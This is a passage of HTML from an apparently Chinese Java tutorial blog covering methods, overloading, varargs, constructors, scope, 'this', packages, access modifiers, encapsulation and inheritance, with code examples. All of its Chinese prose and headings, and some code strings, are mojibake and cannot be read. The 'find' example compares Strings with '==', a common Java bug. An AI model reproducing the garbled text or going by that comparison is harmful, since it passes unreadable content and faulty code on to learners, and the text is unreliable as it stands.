class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(method(method(<span class="hljs-number">100.2</span>,<span class="hljs-number">1.0</span>),<span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>  <span class="hljs-keyword">return</span> a+b;<br> &#125;<br></code></pre></td></tr></table></figure><p>e.g.</p><p>å®šä¹‰ä¸€ä¸ªfindæ–¹æ³•ï¼Œå®ç°å¯¹å­—ç¬¦ä¸²æ•°ç»„å…ƒç´ è¿›è¡ŒæŸ¥æ‰¾ï¼Œå¹¶è¿”å›ç´¢å¼•ï¼Œæ‰¾ä¸åˆ°è¿”å›-1ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>&#125;;<br>  String b=<span class="hljs-string">&quot;c&quot;</span>;<br>  System.out.println(find(a,b));<br>  <br> &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(String[] a,String b)</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] == b) &#123;<br>          <span class="hljs-keyword">return</span> i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="é‡è½½"><a href="#é‡è½½" class="headerlink" title="é‡è½½"></a>é‡è½½</h1><p>åŒä¸€ä¸ªç±»ä¸­ï¼Œå…è®¸å­˜åœ¨ä¸€ä¸ªä»¥ä¸Šçš„åŒåæ–¹æ³•ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°ä¸ªæ•°æˆ–è€…å‚æ•°ç±»å‹ï¼Œå‚æ•°é¡ºåºä¸åŒå³å¯ï¼Œ<strong>ä¸è¿”å›å€¼ç±»å‹æ— å…³</strong>ï¼Œåªçœ‹å‚æ•°åˆ—è¡¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>        System.out.println(<span class="hljs-string">&quot;abc0&quot;</span>);<br>        System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>);<br>        System.out.println(<span class="hljs-literal">false</span>);<br>        System.out.println(<span class="hljs-number">1000.1</span>);<br>        System.out.println(<span class="hljs-number">123</span>);<br>        test(<span class="hljs-string">&quot;x&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å¯å˜å‚æ•°"><a href="#å¯å˜å‚æ•°" class="headerlink" title="å¯å˜å‚æ•°"></a>å¯å˜å‚æ•°</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span>&#123; &#125;<br></code></pre></td></tr></table></figure><p>å¯å˜å‚æ•°æœ¬è´¨å°±æ˜¯æ•°ç»„ï¼Œå®å‚å¯ä»¥ä¸º0ä¸ªæˆ–ä»»æ„å¤šä¸ª</p><p>å¯å˜å‚æ•°çš„å®å‚å¯ä»¥ä¸ºæ•°ç»„ï¼Œè¿™æ—¶å€™åªèƒ½ä¼ ä¸€ä¸ªå‚æ•°</p><p>å½¢å‚åˆ—è¡¨ä¸­åªèƒ½å‡ºç°ä¸€ä¸ªå¯å˜å‚æ•°</p><p>å¯å˜å‚æ•°å¯ä»¥å’Œæ™®é€šå‚æ•°ä»¥å‰æ”¾åœ¨å½¢å‚åˆ—è¡¨ï¼Œä½†å¿…é¡»ä¿è¯å¯å˜å‚æ•°åœ¨æœ€åä¸€ä¸ªè¥¿é¤åˆ—è¡¨ä¸­åªèƒ½å‡ºç°ä¸€ä¸ªå¯å˜å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>       <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>        System.out.println(sum(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;cpp&quot;</span>,a));<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(String d,String b,<span class="hljs-type">int</span>... a)</span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++)&#123;<br>            result+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="æ„é€ å™¨-æ„é€ æ–¹æ³•-æ„é€ å‡½æ•°"><a href="#æ„é€ å™¨-æ„é€ æ–¹æ³•-æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å™¨&#x2F;æ„é€ æ–¹æ³•&#x2F;æ„é€ å‡½æ•°"></a>æ„é€ å™¨&#x2F;æ„é€ æ–¹æ³•&#x2F;æ„é€ å‡½æ•°</h1><h2 id="æ„é€ å™¨ç‰¹ç‚¹"><a href="#æ„é€ å™¨ç‰¹ç‚¹" class="headerlink" title="æ„é€ å™¨ç‰¹ç‚¹"></a>æ„é€ å™¨ç‰¹ç‚¹</h2><p>ä¸ç±»åä¸€è‡´ï¼Œ<strong>æ— è¿”å›å€¼</strong>ï¼›</p><p>å½“å¯¹è±¡åˆ›å»ºæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å¯¹åº”çš„æ„é€ å™¨</p><p>å¦‚æœæ²¡æœ‰å®šä¹‰æ„é€ å™¨ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤çš„æ— å‚æ„é€ å™¨ï¼ˆé»˜è®¤æ„é€ å™¨ï¼‰</p><p>ä¸€ä¸ªç±»å¯ä»¥å®šä¹‰å¤šä¸ªä¸åŒçš„æ„é€ å™¨ï¼Œå³æ„é€ å™¨é‡è½½</p><p>ä¸€æ—¦å®šä¹‰äº†æ„é€ å™¨ï¼Œé»˜è®¤çš„æ„é€ å™¨å°±è¦†ç›–äº†ï¼Œå°±ä¸èƒ½å†ä½¿ç”¨é»˜è®¤çš„æ— å‚æ„é€ å™¨ï¼Œé™¤éè‡ªå·±æ˜¾ç¤ºçš„å®šä¹‰ä¸€ä¸‹</p><h2 id="å¯¹è±¡åˆ›å»ºæµç¨‹"><a href="#å¯¹è±¡åˆ›å»ºæµç¨‹" class="headerlink" title="å¯¹è±¡åˆ›å»ºæµç¨‹"></a>å¯¹è±¡åˆ›å»ºæµç¨‹</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>       <span class="hljs-type">int</span> age=<span class="hljs-number">90</span>;<br>       String name;<br>       Person(String n,<span class="hljs-type">int</span> a)&#123;<br>           name=n;<br>           age=a;<br>       &#125;<br>   &#125;<br>   Person p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">31</span>);<br></code></pre></td></tr></table></figure><p>åŠ è½½ Person ç±»ä¿¡æ¯ï¼Œåªä¼šåŠ è½½ä¸€æ¬¡</p><p>åœ¨å †ä¸­åˆ†é…ç©ºé—´ï¼ˆåœ°å€ï¼‰</p><p>å®Œæˆå¯¹è±¡åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">é»˜è®¤åˆå§‹åŒ–   age=<span class="hljs-number">0</span>   name=<span class="hljs-literal">null</span><br>æ˜¾ç¤ºåˆå§‹åŒ–   age=<span class="hljs-number">90</span>   name=<span class="hljs-literal">null</span><br>æ„é€ å™¨åˆå§‹åŒ–   age=<span class="hljs-number">31</span>   name=abc<br></code></pre></td></tr></table></figure><p>åœ¨å¯¹è±¡åœ¨å †ä¸­çš„åœ°å€ï¼Œè¿”å›ç»™ p (pæ˜¯å¯¹è±¡åï¼Œä¹Ÿå¯ä»¥ç†è§£æˆæ˜¯å¯¹è±¡çš„å¼•ç”¨)</p><h1 id="å˜é‡ä½œç”¨åŸŸ"><a href="#å˜é‡ä½œç”¨åŸŸ" class="headerlink" title="å˜é‡ä½œç”¨åŸŸ"></a>å˜é‡ä½œç”¨åŸŸ</h1><h2 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h2><p>å±æ€§ï¼ˆæˆå‘˜å˜é‡ï¼‰ï¼Œå¯ä»¥è¢«æœ¬ç±»æˆ–å…¶ä»–ç±»ä½¿ç”¨</p><p>å¯ä»¥åŠ è®¿é—®ä¿®é¥°ç¬¦</p><p>æœ‰é»˜è®¤å€¼ï¼Œå¯ä»¥ä¸èµ‹å€¼ç›´æ¥ä½¿ç”¨</p><p>ç”Ÿå‘½å‘¨æœŸé•¿ï¼Œä¼´éšç€å¯¹è±¡çš„åˆ›å»ºè€Œåˆ›å»ºï¼Œé”€æ¯è€Œé”€æ¯</p><h2 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h2><p>ä¸å¯åŠ ä¿®é¥°ç¬¦</p><p>æ²¡æœ‰é»˜è®¤å€¼ï¼Œéœ€è¦èµ‹å€¼ä½¿ç”¨</p><p>ç”Ÿå‘½å‘¨æœŸçŸ­ï¼Œä¼´éšä»£ç å—æ‰§è¡Œè€Œåˆ›å»ºï¼Œç»“æŸè€Œé”€æ¯</p><h2 id="å—çº§ä½œç”¨åŸŸ"><a href="#å—çº§ä½œç”¨åŸŸ" class="headerlink" title="å—çº§ä½œç”¨åŸŸ"></a>å—çº§ä½œç”¨åŸŸ</h2><p><strong>staticé™æ€ä»£ç å—ï¼ˆæœ€å…ˆæ‰§è¡Œï¼‰</strong>ã€æ„é€ ä»£ç å—ã€æ–¹æ³•ä»£ç å—ã€å±€éƒ¨ä»£ç å—ã€è¯­å¥ä»£ç å—</p><p><strong>å±æ€§å’Œå±€éƒ¨å˜é‡å¯ä»¥é‡å</strong>ï¼Œä¼˜å…ˆä½¿ç”¨å±€éƒ¨å˜é‡ï¼Œåœ¨<strong>åŒä¸€ä¸ªä½œç”¨åŸŸä¸­ä¸¤ä¸ªå±€éƒ¨å˜é‡ä¸èƒ½é‡å</strong></p><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><ul><li><p>ä»£è¡¨å½“å‰å¯¹è±¡ï¼Œæ‰“å°å¯¹è±¡çš„ hashCodeï¼Œå“ªä¸ªå¯¹è±¡è°ƒç”¨æ–¹æ³•ï¼Œthis å°±æŒ‡å“ªä¸ªå¯¹è±¡</p></li><li><p>this ç”¨äºåŒºåˆ†å½“å‰å¯¹è±¡çš„å±æ€§å’Œå±€éƒ¨å˜é‡</p></li><li><p>this ä¸èƒ½åœ¨ç±»å¤–éƒ¨ä½¿ç”¨ï¼Œ<strong>åªèƒ½åœ¨ç±»å†…éƒ¨å®ä¾‹æ–¹æ³•ä¸­ä½¿ç”¨</strong>ï¼Œé™æ€æ–¹æ³•ä¸å¯ä½¿ç”¨</p></li><li><p>ç±»å†…éƒ¨èµ‹å€¼å’Œè·å–å®ä¾‹å±æ€§</p></li></ul><h2 id="ç±»å†…éƒ¨è°ƒç”¨æ–¹æ³•"><a href="#ç±»å†…éƒ¨è°ƒç”¨æ–¹æ³•" class="headerlink" title="ç±»å†…éƒ¨è°ƒç”¨æ–¹æ³•"></a>ç±»å†…éƒ¨è°ƒç”¨æ–¹æ³•</h2><p>æ–¹æ³•åï¼ˆå®å‚åˆ—è¡¨ï¼‰</p><p>â€‹this.æ–¹æ³•åï¼ˆå®å‚åˆ—è¡¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-built_in">this</span>.test();<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br> <br></code></pre></td></tr></table></figure><h2 id="thisæ–¹æ³•"><a href="#thisæ–¹æ³•" class="headerlink" title="thisæ–¹æ³•"></a>thisæ–¹æ³•</h2><p>thisï¼ˆå®å‚åˆ—è¡¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span>&#123;<br>       <span class="hljs-built_in">this</span>(name,<span class="hljs-number">30</span>);<span class="hljs-comment">//å¿…é¡»æ”¾åœ¨ç¬¬ä¸€è¡Œæ‰èƒ½ä½¿ç”¨</span><br>       <span class="hljs-built_in">this</span>.name=name;<br>       System.out.println(<span class="hljs-built_in">this</span>.name);<br>       System.out.println(<span class="hljs-string">&quot;this&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String dname,<span class="hljs-type">int</span> age)</span>&#123;<br>       <span class="hljs-built_in">this</span>.age=age;<br>       System.out.println(<span class="hljs-string">&quot;Cat(String dname,int agr)&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h1><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>åŒºåˆ†ç›¸åŒåå­—ç±»ï¼Œæ–¹ä¾¿ç®¡ç†ï¼Œæ§åˆ¶è®¿é—®èŒƒå›´</p><h2 id="å»ºåŒ…"><a href="#å»ºåŒ…" class="headerlink" title="å»ºåŒ…"></a>å»ºåŒ…</h2><p>å»ºç«‹ä¸åŒçš„æ–‡ä»¶å¤¹&#x2F;ç›®å½•æ¥ä¿å­˜ç±»æ–‡ä»¶</p><h2 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h2><p>åŸºæœ¬è¯­æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butterfly.app<br><span class="hljs-keyword">package</span> <span class="hljs-comment">//å…³é”®å­—</span><br>com.butterfly.app <span class="hljs-comment">//åŒ…å</span><br></code></pre></td></tr></table></figure><p>package çš„ä½œç”¨æ˜¯å£°æ˜å½“å‰ç±»æ‰€åœ¨çš„åŒ…ï¼Œ<strong>ä¸€ä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ª package</strong></p><h2 id="å¯¼åŒ…"><a href="#å¯¼åŒ…" class="headerlink" title="å¯¼åŒ…"></a>å¯¼åŒ…</h2><p>import æŒ‡ä»¤ä½ç½®æ”¾åœ¨ package ä¸‹ï¼Œåœ¨ç±»å®šä¹‰å‰é¢ï¼Œå¯ä»¥æœ‰å¤šå¥ä¸”æ²¡æœ‰é¡ºåºè¦æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br>java.lang.*  æ˜¯åŸºæœ¬åŒ…ï¼Œé»˜è®¤å¼•å…¥ï¼Œä¸éœ€è¦å†å¼•å…¥<br></code></pre></td></tr></table></figure><h1 id="è®¿é—®ä¿®é¥°ç¬¦"><a href="#è®¿é—®ä¿®é¥°ç¬¦" class="headerlink" title="è®¿é—®ä¿®é¥°ç¬¦"></a>è®¿é—®ä¿®é¥°ç¬¦</h1><p>æ§åˆ¶å±æ€§å’Œæ–¹æ³•çš„è®¿é—®æƒé™</p><p>ä¿®é¥°ç±»çš„å±æ€§ï¼Œæˆå‘˜æ–¹æ³•åŠç±»</p><p>åªæœ‰é»˜è®¤çš„å’Œ public æ‰èƒ½ä¿®é¥°ç±»ï¼Œå¹¶ä¸”éµå¾ªä¸Šè¿°è®¿é—®æƒé™çš„ç‰¹ç‚¹</p><table><thead><tr><th></th><th>æœ¬ç±»</th><th>åŒåŒ…</th><th>å­ç±»</th><th>ä¸åŒåŒ…</th></tr></thead><tbody><tr><td>public</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>protected</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td>Ã—</td></tr><tr><td>private</td><td>âˆš</td><td>Ã—</td><td>Ã—</td><td>Ã—</td></tr><tr><td>æ²¡æœ‰ä¿®é¥°ç¬¦</td><td>âˆš</td><td>âˆš</td><td>Ã—</td><td>Ã—</td></tr></tbody></table><h1 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h1><p>æŠŠå±æ€§ç§æœ‰ï¼Œå®šä¹‰å…¬å¼€çš„ getã€set æ–¹æ³•æ¥éªŒè¯æ•°æ®åˆç†æ€§</p><p>e.g</p><p>å®šä¹‰ Account ç±»ï¼Œè¦æ±‚å…·æœ‰å±æ€§ï¼šå§“å nameï¼ˆé•¿åº¦ä¸º2-4ï¼Œåˆå§‹åŒ–åä¸å¯ä¿®æ”¹ï¼‰ã€ä½™é¢ balanceï¼ˆå¿…é¡»å¤§äº20ï¼‰ã€å¯†ç  passwordï¼ˆå¿…é¡»æ˜¯å…­ä½ï¼‰ã€‚å¦‚æœä¸æ»¡è¶³ï¼Œåˆ™ç»™å‡ºæç¤ºä¿¡æ¯ï¼Œå¹¶ç»™é»˜è®¤å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">Account.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> String password=<span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">if</span>(name==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;åå­—ä¸èƒ½è®¾ç½®ä¸ºnull&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.name!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;åå­—åªèƒ½ä¿®æ”¹ä¸€æ¬¡&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (name.length() &lt; <span class="hljs-number">2</span> || name.length() &gt; <span class="hljs-number">4</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;åå­—é•¿åº¦éœ€è¦2-4ä½&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>            &#125;<br>        &#125;<br>       <br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-keyword">if</span>(balance&lt;=<span class="hljs-number">20</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;ä½™é¢å¿…é¡»å¤§äº20&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">this</span>.balance = balance;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">if</span>(password==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;passwordä¸èƒ½è®¾ç½®ä¸ºnull&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(password.length()==<span class="hljs-number">6</span>)&#123;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;å¯†ç å¿…é¡»æ˜¯å…­ä½&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>Hello.java<br>Account account=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>();<br>        account.setName(<span class="hljs-string">&quot;null&quot;</span>);<br>        System.out.println(account.getName());<br>        account.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br>        System.out.println(account.getPassword());<br><br></code></pre></td></tr></table></figure><h1 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h1><h2 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">å­ç±»</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">çˆ¶ç±»</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>a.     çˆ¶ç±»&#x2F;è¶…ç±»&#x2F;åŸºç±»</p><p>â€‹å­ç±»&#x2F;æ´¾ç”Ÿç±»</p><p>b. å¤šä¸ªç±»å­˜åœ¨ç›¸åŒçš„å±æ€§å’Œæ–¹æ³•æ—¶ï¼Œä»ä¸­æŠ½è±¡å‡ºçˆ¶ç±»ï¼Œåœ¨çˆ¶ç±»ä¸­å®šä¹‰ç›¸åŒçš„å±æ€§å’Œæ–¹æ³•ï¼Œæ‰€æœ‰å­ç±»ä¸éœ€è¦å†é‡æ–°å®šä¹‰ï¼Œåªéœ€è¦é€šè¿‡ extends å£°æ˜ç»§æ‰¿çˆ¶ç±»å°±è¡Œ</p><p>c. å­ç±»è‡ªåŠ¨æ‹¥æœ‰çˆ¶ç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼ˆå—è®¿é—®ä¿®é¥°ç¬¦å½±å“ï¼‰</p><p>d. å­ç±»ä¸èƒ½è®¿é—®çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡çˆ¶ç±»çš„å…¬å¼€æ–¹æ³•å»è®¿é—®ï¼Œç±»ä¼¼å°è£…</p><p>e. å•ç»§æ‰¿æœºåˆ¶ï¼Œå­ç±»æœ€å¤šåªèƒ½ç»§æ‰¿ä¸€ä¸ªçˆ¶ç±»ï¼ˆç›´æ¥ç»§æ‰¿ï¼‰ï¼Œä½†æ˜¯å¯ä»¥å®ç°å¤šä¸ªæ¥å£</p><p>f. æ‰€æœ‰ç±»éƒ½æ˜¯ Object çš„å­ç±»</p><p>g. å¤šæ¬¡ç»§æ‰¿ æŸ¥çœ‹æ–¹æ³•</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ 